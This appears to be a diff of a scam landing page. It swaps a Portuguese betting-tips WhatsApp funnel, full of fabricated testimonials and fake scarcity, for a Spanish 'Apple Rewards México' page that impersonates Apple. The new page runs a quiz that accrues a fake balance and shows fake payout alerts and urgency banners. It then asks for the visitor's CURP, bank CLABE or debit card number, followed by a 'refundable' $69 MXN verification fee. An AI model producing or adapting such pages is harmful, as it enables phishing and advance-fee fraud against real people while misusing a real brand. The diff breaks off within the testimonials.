@@ -1,441 +1,812 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="es-MX">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Comunidade GoldBet VIP - Futebol & Green</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <title>Apple Rewards México</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --apple-blue: #0071e3;
+            --apple-blue-dark: #0059b3;
+            --apple-bg: #f5f5f7;
+            --white: #ffffff;
+            --text-dark: #1d1d1f;
+            --text-gray: #86868b;
+            --success: #00c851;
+            --success-dark: #00a040;
+            --gold: #f5a623;
+            --red: #ff3b30;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            background: radial-gradient(ellipse at 50% 0%, hsla(142,71%,45%,0.15) 0%, transparent 60%),
-                        radial-gradient(ellipse at 80% 50%, hsla(43,74%,49%,0.10) 0%, transparent 50%),
-                        radial-gradient(ellipse at 20% 80%, hsla(142,71%,45%,0.08) 0%, transparent 40%),
-                        linear-gradient(180deg, hsl(140,35%,6%) 0%, hsl(145,40%,4%) 50%, hsl(40,30%,5%) 100%);
-            color: white;
-            font-family: 'Outfit', sans-serif;
+            background: linear-gradient(135deg, #f5f5f7 0%, #e8e8ed 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; justify-content: center;
+            align-items: flex-start; min-height: 100vh;
+            color: var(--text-dark);
             overflow-x: hidden;
         }
-        h1, h2, h3, h4, h5, h6 { font-family: 'Space Grotesk', sans-serif; }
 
-        .text-gradient-gold {
-            background: linear-gradient(135deg, hsl(43,74%,49%), hsl(43,90%,70%));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
-        }
-        .text-gradient-green {
-            background: linear-gradient(135deg, hsl(142,71%,45%), hsl(160,60%,55%));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
-        }
-        .glass-card {
-            background: linear-gradient(135deg, hsla(142,30%,10%,0.85), hsla(43,20%,8%,0.9));
-            border: 1px solid hsla(142,50%,30%,0.3);
+        /* NOTIFICACIONES */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(150%);
+            width: 90%;
+            max-width: 370px;
+            background: rgba(255, 255, 255, 0.97);
             backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 18px;
+            padding: 14px 18px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.12), 0 0 0 1px rgba(0,0,0,0.05);
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            z-index: 9999;
+            transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border-left: 4px solid var(--success);
         }
-        .glow-green {
-            box-shadow: 0 0 30px hsla(142,71%,45%,0.3), 0 0 60px hsla(142,71%,45%,0.1);
+        .notification.show { transform: translateX(-50%) translateY(0); }
+        .notif-img { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; border: 2px solid #e5e5e5; }
+        .notif-content { flex: 1; }
+        .notif-title { font-size: 13px; font-weight: 700; color: #1d1d1f; }
+        .notif-text { font-size: 12px; color: var(--text-gray); margin-top: 2px; }
+        .notif-badge { background: var(--success); color: #fff; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 20px; }
+
+        /* ANIMACIONES */
+        .shine { animation: shine 0.8s ease-out; }
+        @keyframes shine {
+            0% { text-shadow: 0 0 0px gold; transform: scale(1); }
+            50% { text-shadow: 0 0 20px gold, 0 0 40px rgba(245,166,35,0.3); transform: scale(1.08); }
+            100% { text-shadow: 0 0 0px gold; transform: scale(1); }
         }
 
-        .btn-cta {
-            background: linear-gradient(135deg, hsl(142,71%,40%), hsl(142,80%,50%), hsl(43,74%,49%));
-            background-size: 200% 200%;
-            animation: pulse-glow 2s infinite, gradient-shift 4s ease infinite;
-            position: relative; overflow: hidden;
-        }
-        .btn-cta::after {
-            content: ''; position: absolute; inset: 0;
-            background: linear-gradient(to right, transparent, rgba(255,255,255,0.15), transparent);
-            background-size: 200% 100%;
-            animation: shimmer 3s infinite;
-        }
-        @keyframes pulse-glow {
-            0%, 100% { box-shadow: 0 0 20px hsla(142,71%,45%,0.4), 0 0 40px hsla(142,71%,45%,0.2); }
-            50% { box-shadow: 0 0 30px hsla(142,71%,45%,0.6), 0 0 60px hsla(142,71%,45%,0.3), 0 0 80px hsla(43,74%,49%,0.2); }
-        }
-        @keyframes gradient-shift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
+        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.03); } }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes glow { 0%,100% { box-shadow: 0 0 5px rgba(0,113,227,0.3); } 50% { box-shadow: 0 0 20px rgba(0,113,227,0.6); } }
+        @keyframes coinDrop {
+            0% { opacity: 1; transform: translateY(0) scale(1); }
+            100% { opacity: 0; transform: translateY(-60px) scale(0.5); }
         }
         @keyframes shimmer {
             0% { background-position: -200% 0; }
             100% { background-position: 200% 0; }
         }
-        @keyframes ping {
-            75%, 100% { transform: scale(2); opacity: 0; }
+        @keyframes urgencyPulse {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        @keyframes float {
+            0%,100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
         }
 
-        .progress-fill { transition: width 2.5s ease-out; }
+        .fade-in { animation: fadeInUp 0.5s ease-out; }
+        .slide-down { animation: slideDown 0.3s ease-out; }
 
-        .notif-entrou {
-            position: fixed; bottom: 20px; left: 20px;
-            background: rgba(255,255,255,0.95); color: #333;
-            padding: 10px 15px; border-radius: 50px;
+        /* CONTENEDORES */
+        .container, .resgate-container, .taxa-container, .envio-container {
+            width: 95%; max-width: 420px; background: var(--white);
+            margin: 20px auto; border-radius: 24px; padding: 28px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.03);
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        /* BARRA DE URGENCIA */
+        .urgencia-box {
+            background: linear-gradient(135deg, #ff3b30, #ff6259);
+            color: white; border-radius: 14px;
+            padding: 10px 16px; text-align: center; font-size: 12px;
+            font-weight: 700; margin-bottom: 22px;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            animation: urgencyPulse 2s ease-in-out infinite;
+            box-shadow: 0 4px 15px rgba(255,59,48,0.3);
+        }
+        .urgencia-box .dot {
+            width: 8px; height: 8px; background: #fff; border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+
+        /* TOPBAR */
+        .topbar {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 22px; padding-bottom: 16px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .logo {
             display: flex; align-items: center; gap: 10px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
-            z-index: 100; transform: translateX(-120%);
-            transition: transform 0.5s cubic-bezier(0.34,1.56,0.64,1);
+            font-weight: 800; font-size: 17px; letter-spacing: -0.3px;
         }
-        .notif-entrou.show { transform: translateX(0); }
-        .notif-entrou img { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; }
-
-        .carousel-track {
-            display: flex;
-            animation: scroll 40s linear infinite;
+        .logo img { width: 24px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
+        .money-box {
+            background: linear-gradient(135deg, #e8fdf0, #d4f5e0);
+            padding: 10px 18px; border-radius: 14px;
+            font-weight: 800; font-size: 15px; color: var(--success);
+            border: 1px solid rgba(0,200,81,0.2);
+            position: relative;
+            transition: all 0.3s ease;
         }
-        .carousel-track:hover { animation-play-state: paused; }
-        @keyframes scroll {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-50%); }
-        }
-        .testimonial-card {
-            min-width: 260px;
-            max-width: 300px;
-            margin: 0 8px;
-            padding: 20px;
-            border-radius: 16px;
-            background: linear-gradient(135deg, hsla(142,25%,10%,0.85), hsla(43,15%,8%,0.9));
-            border: 1px solid hsla(142,40%,25%,0.3);
-            backdrop-filter: blur(20px);
-            flex-shrink: 0;
+        .money-box::before {
+            content: '💰';
+            margin-right: 4px;
         }
 
-        @media (max-width: 640px) {
-            .testimonial-card {
-                min-width: 220px;
-                max-width: 260px;
-                margin: 0 6px;
-                padding: 16px;
-            }
+        /* COIN ANIMATION */
+        .coin-float {
+            position: absolute;
+            font-size: 20px;
+            pointer-events: none;
+            animation: coinDrop 1s ease-out forwards;
         }
 
-        .particle {
-            position: fixed; width: 4px; height: 4px; border-radius: 50%;
-            background: hsla(142,71%,45%,0.3); pointer-events: none;
-            animation: float-particle 4s ease-in-out infinite;
+        /* PROGRESS */
+        .progress-wrapper {
+            width: 100%; height: 8px; background: #e5e5ea;
+            border-radius: 10px; margin-bottom: 8px; overflow: hidden;
+            position: relative;
         }
-        @keyframes float-particle {
-            0%, 100% { transform: translateY(0); opacity: 0.3; }
-            50% { transform: translateY(-20px); opacity: 0.7; }
+        .progress-bar {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, var(--apple-blue), #34aadc);
+            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            border-radius: 10px;
+            position: relative;
         }
-
-        .fade-up {
-            opacity: 0; transform: translateY(30px);
-            animation: fadeUp 0.6s ease-out forwards;
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            background-size: 200% 100%;
+            animation: shimmer 2s infinite;
         }
-        @keyframes fadeUp {
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .delay-1 { animation-delay: 0.15s; }
-        .delay-2 { animation-delay: 0.3s; }
-        .delay-3 { animation-delay: 0.45s; }
-        .delay-4 { animation-delay: 0.6s; }
-        .delay-5 { animation-delay: 0.75s; }
-
-        .logo-glow {
-            animation: logoIn 0.6s ease-out forwards;
-            opacity: 0; transform: scale(0.8);
-        }
-        @keyframes logoIn {
-            to { opacity: 1; transform: scale(1); }
+        .progress-text {
+            font-size: 12px; color: var(--text-gray);
+            text-align: right; margin-bottom: 20px; font-weight: 600;
         }
 
-        .banner-container {
+        /* PREGUNTA */
+        h2 {
+            font-size: 20px; text-align: center; margin-bottom: 20px;
+            font-weight: 800; line-height: 1.4; letter-spacing: -0.3px;
+        }
+
+        .option {
+            background: #fafafa; padding: 16px 18px; border-radius: 16px;
+            border: 2px solid #ebebeb; margin-bottom: 10px; cursor: pointer;
+            transition: all 0.25s ease; font-weight: 600; font-size: 15px;
+            display: flex; align-items: center; gap: 12px;
+            position: relative; overflow: hidden;
+        }
+        .option::before {
+            content: '';
+            position: absolute;
+            left: 0; top: 0; bottom: 0;
+            width: 0; background: rgba(0,113,227,0.08);
+            transition: width 0.3s ease;
+        }
+        .option:hover {
+            background: #f0f5ff; border-color: #c5d9f0;
+            transform: translateX(4px);
+        }
+        .option:hover::before { width: 100%; }
+        .option:active { transform: scale(0.98); }
+        .option.selected {
+            border: 2px solid var(--apple-blue);
+            background: linear-gradient(135deg, #f0f7ff, #e8f4fd);
+            box-shadow: 0 4px 15px rgba(0,113,227,0.15);
+        }
+        .option.selected::after {
+            content: '✓';
+            position: absolute; right: 16px;
+            color: var(--apple-blue); font-weight: 900; font-size: 18px;
+        }
+
+        /* BOTONES */
+        .btn-primary {
             width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
-            border-radius: 16px;
+            background: linear-gradient(135deg, #1d1d1f, #333);
+            color: #fff; padding: 17px;
+            border: none; border-radius: 16px;
+            font-size: 16px; font-weight: 700;
+            cursor: pointer; transition: all 0.3s ease;
+            margin-top: 12px;
+            letter-spacing: 0.3px;
+            position: relative;
             overflow: hidden;
-            border: 2px solid hsla(142,50%,30%,0.4);
-            box-shadow: 0 8px 32px hsla(142,71%,45%,0.2), 0 0 60px hsla(43,74%,49%,0.1);
         }
-        .banner-container img {
-            width: 100%;
-            height: auto;
-            display: block;
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%; width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.5s;
+        }
+        .btn-primary:hover::before { left: 100%; }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.2); }
+        .btn-primary:disabled { opacity: 0.35; cursor: not-allowed; transform: none; box-shadow: none; }
+        .btn-primary:active { transform: scale(0.98); }
+
+        .btn-success {
+            background: linear-gradient(135deg, var(--success), var(--success-dark));
+            animation: glow 2s infinite;
+        }
+        .btn-success:hover {
+            box-shadow: 0 8px 30px rgba(0,200,81,0.4);
         }
 
-        .section-divider {
-            height: 1px;
-            background: linear-gradient(90deg, transparent, hsla(142,71%,45%,0.3), hsla(43,74%,49%,0.3), transparent);
-            margin: 2rem 0;
+        .btn-blue {
+            background: linear-gradient(135deg, var(--apple-blue), var(--apple-blue-dark));
+        }
+        .btn-blue:hover {
+            box-shadow: 0 8px 30px rgba(0,113,227,0.4);
         }
 
-        .stats-card {
-            background: linear-gradient(135deg, hsla(142,30%,10%,0.7), hsla(43,20%,8%,0.7));
-            border: 1px solid hsla(142,50%,30%,0.25);
+        /* LOADER */
+        .loader {
+            border: 3px solid #f3f3f3; border-top: 3px solid var(--apple-blue);
+            border-radius: 50%; width: 22px; height: 22px;
+            animation: spin 0.8s linear infinite;
+            display: inline-block; margin-right: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* POPUP */
+        .popup {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.6);
+            display: none; justify-content: center; align-items: center; z-index: 1000;
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+        }
+        .popup-box {
+            background: #fff; width: 88%; max-width: 360px;
+            padding: 35px 30px; border-radius: 28px; text-align: center;
+            animation: fadeInUp 0.4s ease-out;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+        }
+        .popup-icon {
+            font-size: 50px; margin-bottom: 10px;
+            animation: float 2s ease-in-out infinite;
+        }
+        .popup-valor {
+            font-size: 38px; font-weight: 900; color: var(--success);
+            margin: 12px 0; letter-spacing: -1px;
+        }
+        .popup-label {
+            font-size: 13px; color: var(--text-gray); font-weight: 500;
+            margin-bottom: 5px;
+        }
+        .popup-subtitle {
+            font-size: 14px; color: #666; margin-bottom: 20px;
+        }
+
+        /* RESGATE */
+        .resgate-container, .taxa-container, .envio-container { display: none; }
+
+        .saldo-display {
+            background: linear-gradient(135deg, #f0fdf4, #dcfce7);
+            border: 2px solid rgba(0,200,81,0.2);
+            border-radius: 20px; padding: 24px; text-align: center;
+            margin-bottom: 24px;
+        }
+        .saldo-label {
+            font-size: 12px; font-weight: 700; color: var(--text-gray);
+            text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 8px;
+        }
+        .saldo-value {
+            font-size: 36px; font-weight: 900; color: var(--success);
+            letter-spacing: -1px;
+        }
+
+        /* INPUTS */
+        .input-group { margin-bottom: 16px; }
+        .input-group label {
+            display: block; font-size: 13px; font-weight: 700;
+            color: var(--text-dark); margin-bottom: 6px;
+        }
+        input, select {
+            width: 100%; padding: 15px 16px; border-radius: 14px;
+            border: 2px solid #e5e5ea; font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+            background: #fafafa;
+            -webkit-appearance: none;
+        }
+        input:focus, select:focus {
+            outline: none; border-color: var(--apple-blue);
+            box-shadow: 0 0 0 4px rgba(0,113,227,0.1);
+            background: #fff;
+        }
+        select { cursor: pointer; }
+
+        /* TAXA ITEMS */
+        .taxa-item {
+            display: flex; align-items: center; gap: 14px;
+            background: linear-gradient(135deg, #fafafa, #f5f5f7);
+            padding: 16px; border-radius: 16px; margin-bottom: 12px;
+            text-align: left; border: 1px solid #ebebeb;
+            transition: all 0.3s ease;
+        }
+        .taxa-item:hover { transform: translateX(4px); }
+        .taxa-item .icon {
+            font-size: 24px; width: 44px; height: 44px;
+            display: flex; align-items: center; justify-content: center;
+            background: #fff; border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+        .taxa-item b { font-size: 14px; display: block; margin-bottom: 2px; }
+        .taxa-item p { font-size: 12px; margin: 0; color: var(--text-gray); line-height: 1.4; }
+
+        /* BADGES */
+        .badge {
+            display: inline-flex; align-items: center; gap: 5px;
+            padding: 5px 12px; border-radius: 20px;
+            font-size: 11px; font-weight: 700;
+        }
+        .badge-secure {
+            background: #e8f5e9; color: #2e7d32;
+        }
+        .badge-fast {
+            background: #fff3e0; color: #e65100;
+        }
+
+        /* TRUST INDICATORS */
+        .trust-bar {
+            display: flex; justify-content: center; gap: 16px;
+            margin-top: 16px; padding-top: 16px;
+            border-top: 1px solid #f0f0f0;
+        }
+        .trust-item {
+            display: flex; align-items: center; gap: 4px;
+            font-size: 11px; color: var(--text-gray); font-weight: 500;
+        }
+
+        /* ENVÍO */
+        .envio-header {
+            text-align: center; margin-bottom: 24px;
+        }
+        .envio-header h2 { margin-bottom: 8px; }
+        .envio-header p { font-size: 14px; color: var(--text-gray); }
+
+        /* POPUP CONQUISTA */
+        .conquista-box {
+            background: linear-gradient(135deg, #1d1d1f, #2d2d2f);
+            color: #fff;
+        }
+        .conquista-box h2 { color: #fff; }
+        .conquista-box p { color: rgba(255,255,255,0.7); }
+        .conquista-valor {
+            font-size: 32px; font-weight: 900;
+            background: linear-gradient(135deg, var(--gold), #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 12px 0;
+        }
+
+        /* VALIDANDO */
+        .validando-box {
+            display: none; align-items: center; justify-content: center;
+            gap: 10px; padding: 16px; background: #f8f9fa;
+            border-radius: 14px; margin-top: 12px;
+            font-size: 14px; color: var(--text-gray); font-weight: 500;
+        }
+
+        /* SECURITY BADGES */
+        .security-footer {
+            display: flex; flex-direction: column; align-items: center;
+            gap: 8px; margin-top: 20px;
+        }
+        .security-badges {
+            display: flex; gap: 8px; flex-wrap: wrap; justify-content: center;
         }
     </style>
 </head>
 <body>
-    <!-- Particles -->
-    <div class="particle" style="top:10%;left:5%;animation-delay:0s;"></div>
-    <div class="particle" style="top:30%;left:90%;animation-delay:1s;"></div>
-    <div class="particle" style="top:60%;left:15%;animation-delay:2s;"></div>
-    <div class="particle" style="top:80%;left:80%;animation-delay:3s;"></div>
-    <div class="particle" style="top:50%;left:50%;animation-delay:1.5s;"></div>
-    <div class="particle" style="top:20%;left:70%;animation-delay:0.5s;"></div>
 
-    <!-- Notification -->
-    <div class="notif-entrou" id="notif">
-        <img src="https://i.pravatar.cc/100?img=3" alt="avatar">
+<!-- Notificación -->
+<div class="notification" id="notification">
+    <img class="notif-img" id="notifImg" src="" alt="usuario">
+    <div class="notif-content">
+        <div class="notif-title" id="notifTitle"></div>
+        <div class="notif-text" id="notifText"></div>
+    </div>
+    <span class="notif-badge">SPEI ✓</span>
+</div>
+
+<!-- QUIZ -->
+<div class="container" id="quizContainer">
+    <div class="urgencia-box">
+        <span class="dot"></span>
+        ⚠️ ÚLTIMOS <span id="vagas">12</span> CUPOS DISPONIBLES EN MÉXICO
+    </div>
+
+    <div class="topbar">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+            Apple Rewards
+        </div>
+        <div class="money-box" id="saldoTopo">$0.00 MXN</div>
+    </div>
+
+    <div class="progress-wrapper">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="progress-text" id="progressText">Pregunta 1 de 12</div>
+
+    <h2 id="qTitle"></h2>
+    <div id="options"></div>
+
+    <button class="btn-primary" id="btnNext" disabled>Continuar ➜</button>
+
+    <div class="trust-bar">
+        <div class="trust-item">🔒 Seguro</div>
+        <div class="trust-item">🇲🇽 México</div>
+        <div class="trust-item">⚡ Instantáneo</div>
+    </div>
+</div>
+
+<!-- RETIRO -->
+<div class="resgate-container" id="resgateContainer">
+    <div class="topbar">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+            Apple Rewards
+        </div>
+    </div>
+
+    <h2>¡Retiro Disponible! 💸</h2>
+
+    <div class="saldo-display">
+        <div class="saldo-label">SALDO TOTAL ACUMULADO</div>
+        <div class="saldo-value" id="saldoFinal">$0.00 MXN</div>
+    </div>
+
+    <div class="input-group">
+        <label>Selecciona método de recepción (SPEI):</label>
+        <select id="metodoSelect">
+            <option value="curp">CURP</option>
+            <option value="clabe">CLABE Interbancaria</option>
+            <option value="tarjeta">Número de Tarjeta de Débito</option>
+        </select>
+    </div>
+
+    <div class="input-group">
+        <label id="inputLabel">Ingresa tu CURP:</label>
+        <input type="text" id="chaveInput" placeholder="Ej: GARC850101HDFRRL09">
+    </div>
+
+    <div class="validando-box" id="validando">
+        <div class="loader"></div>
+        Consultando elegibilidad con Apple México...
+    </div>
+
+    <button class="btn-primary btn-success" id="btnSolicitar">REALIZAR RETIRO AHORA</button>
+
+    <div class="security-footer">
+        <div class="security-badges">
+            <span class="badge badge-secure">🔒 Cifrado SSL</span>
+            <span class="badge badge-fast">⚡ SPEI en minutos</span>
+        </div>
+    </div>
+</div>
+
+<!-- TASA / VERIFICACIÓN -->
+<div class="taxa-container" id="taxaContainer">
+    <div style="text-align:center; margin-bottom: 20px;">
+        <span style="font-size: 48px;">🔐</span>
+        <h2 style="margin-top: 10px;">Verificación de Identidad</h2>
+        <p style="font-size: 14px; color: var(--text-gray); margin-top: 8px;">
+            Para liberar el depósito de <b id="valorComTaxa"></b>, se requiere validar tu cuenta mediante una tasa mínima reembolsable.
+        </p>
+    </div>
+
+    <div class="taxa-item">
+        <div class="icon">🔄</div>
         <div>
-            <div style="font-weight:600;font-size:13px;">Alguém</div>
-            <div style="font-size:11px;color:#888;">Acabou de entrar no grupo</div>
+            <b>Importe Reembolsable</b>
+            <p>Los $69 MXN se sumarán a tu retiro automáticamente.</p>
         </div>
     </div>
 
-    <!-- Main Content -->
-    <div class="max-w-lg mx-auto px-4 py-8">
-
-        <!-- Banner -->
-        <div class="fade-up">
-            <div class="banner-container">
-                <img src="https://disrupty-uploads-20251016.s3.us-east-1.amazonaws.com/checkout-blocks/1773975365308_w4vwf5" alt="GoldBet VIP Banner">
-            </div>
-        </div>
-
-        <!-- Live Badge -->
-        <div class="flex justify-center mt-6 fade-up delay-1">
-            <div class="flex items-center gap-2 px-4 py-2 rounded-full text-sm font-semibold" style="background:hsla(0,80%,50%,0.15);border:1px solid hsla(0,80%,50%,0.3);color:hsl(0,80%,65%);">
-                <span class="relative flex h-2.5 w-2.5">
-                    <span class="absolute inline-flex h-full w-full rounded-full opacity-75" style="background:hsl(0,80%,50%);animation:ping 1s cubic-bezier(0,0,0.2,1) infinite;"></span>
-                    <span class="relative inline-flex rounded-full h-2.5 w-2.5" style="background:hsl(0,80%,50%);"></span>
-                </span>
-                AO VIVO
-            </div>
-        </div>
-
-        <!-- Title -->
-        <div class="text-center mt-6 fade-up delay-2">
-            <h1 class="text-2xl sm:text-3xl font-black leading-tight">
-                <span class="text-gradient-gold">COMUNIDADE REI DELAS 👑</span><br>
-                <span class="text-gradient-green">A MAIOR COMUNIDADE DE SINAIS E HORÁRIOS PAGANTES DO BRASIL. 🔥</span>
-            </h1>
-        </div>
-
-        <!-- Description -->
-        <div class="text-center mt-5 fade-up delay-3">
-            <p class="text-sm sm:text-base" style="color:hsla(0,0%,100%,0.75);line-height:1.7;">
-                Receba análises diárias de nossos analistas profissionais, horários pagantes, palpites exclusivos e acompanhe lives ao vivo operando nos melhores jogos do dia 💰
-            </p>
-            <p class="mt-3 font-semibold text-sm" style="color:hsl(43,90%,65%);">
-                Últimas vagas para entrar no grupo!
-            </p>
-        </div>
-
-        <!-- Progress Bar -->
-        <div class="mt-6 fade-up delay-4">
-            <div class="glass-card rounded-2xl p-5">
-                <div class="flex justify-between items-center mb-3">
-                    <span class="text-sm font-semibold" style="color:hsl(43,90%,65%);">⚠️ GRUPO NO WHATSAPP QUASE CHEIO</span>
-                    <span class="text-sm font-bold text-gradient-green" id="progressText">0% PREENCHIDAS</span>
-                </div>
-                <div class="w-full rounded-full h-3 overflow-hidden" style="background:hsla(142,20%,15%,0.5);">
-                    <div class="progress-fill h-full rounded-full" id="progressBar" style="width:0%;background:linear-gradient(90deg,hsl(142,71%,45%),hsl(43,74%,49%));"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Stats -->
-        <div class="grid grid-cols-2 gap-4 mt-6 fade-up delay-5">
-            <div class="stats-card rounded-2xl p-5 text-center">
-                <div class="text-2xl font-black text-gradient-green">14.7k</div>
-                <div class="text-xs mt-1" style="color:hsla(0,0%,100%,0.6);">Membros Ativos</div>
-            </div>
-            <div class="stats-card rounded-2xl p-5 text-center">
-                <div class="text-2xl font-black text-gradient-gold">98%</div>
-                <div class="text-xs mt-1" style="color:hsla(0,0%,100%,0.6);">Assertividade Média</div>
-            </div>
-        </div>
-
-        <!-- CTA Button -->
-        <div class="mt-8 fade-up delay-5">
-            <a href="https://chat.whatsapp.com/Kzy2K3I1feOGVtQsBk3ZmD?mode=gi_t" target="_blank" rel="noopener noreferrer" class="btn-cta block w-full text-center py-4 rounded-2xl text-lg font-bold text-white no-underline">
-                Entrar no Grupo Agora!
-            </a>
-            <p class="text-center text-xs mt-3" style="color:hsla(0,0%,100%,0.5);">🔓 Acesso 100% Gratuito ao grupo</p>
-        </div>
-
-    </div>
-
-    <!-- Testimonials Section -->
-    <div class="mt-12 mb-12">
-        <div class="section-divider"></div>
-        <h2 class="text-center text-xl sm:text-2xl font-bold mb-8 fade-up px-4">
-            💬 <span class="text-gradient-gold">O QUE DIZEM SOBRE A COMUNIDADE:</span>
-        </h2>
-
-        <div style="overflow:hidden;width:100%;padding:10px 0;">
-            <div class="carousel-track" id="carouselTrack">
-                <!-- Cards duplicados para loop infinito -->
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=1" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Lucas M.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Entrei sem acreditar muito, mas já no primeiro dia recebi sinais que me fizeram lucrar. Grupo sensacional!"</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=5" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Amanda S.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Melhor comunidade que já participei! Os analistas são muito competentes e as lives são incríveis."</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=8" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Rafael C.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Taxa de acerto absurda! Fiz minha banca crescer 300% em duas semanas seguindo os sinais."</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=12" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Juliana P.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Grupo top demais! Suporte incrível e os resultados falam por si. Recomendo de olhos fechados."</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=15" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Pedro H.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
-                    <p class="text-xs" style="color:hsla(0,0%,100%,0.7);line-height:1.6;">"Estava cético no início mas os resultados são reais. Melhor investimento que já fiz!"</p>
-                </div>
-
-                <div class="testimonial-card">
-                    <div class="flex items-center gap-3 mb-3">
-                        <img src="https://i.pravatar.cc/40?img=20" alt="" class="w-10 h-10 rounded-full">
-                        <div>
-                            <div class="font-semibold text-sm">Carla F.</div>
-                            <div class="text-xs" style="color:hsl(142,71%,45%);">⭐⭐⭐⭐⭐</div>
-                        </div>
-                    </div>
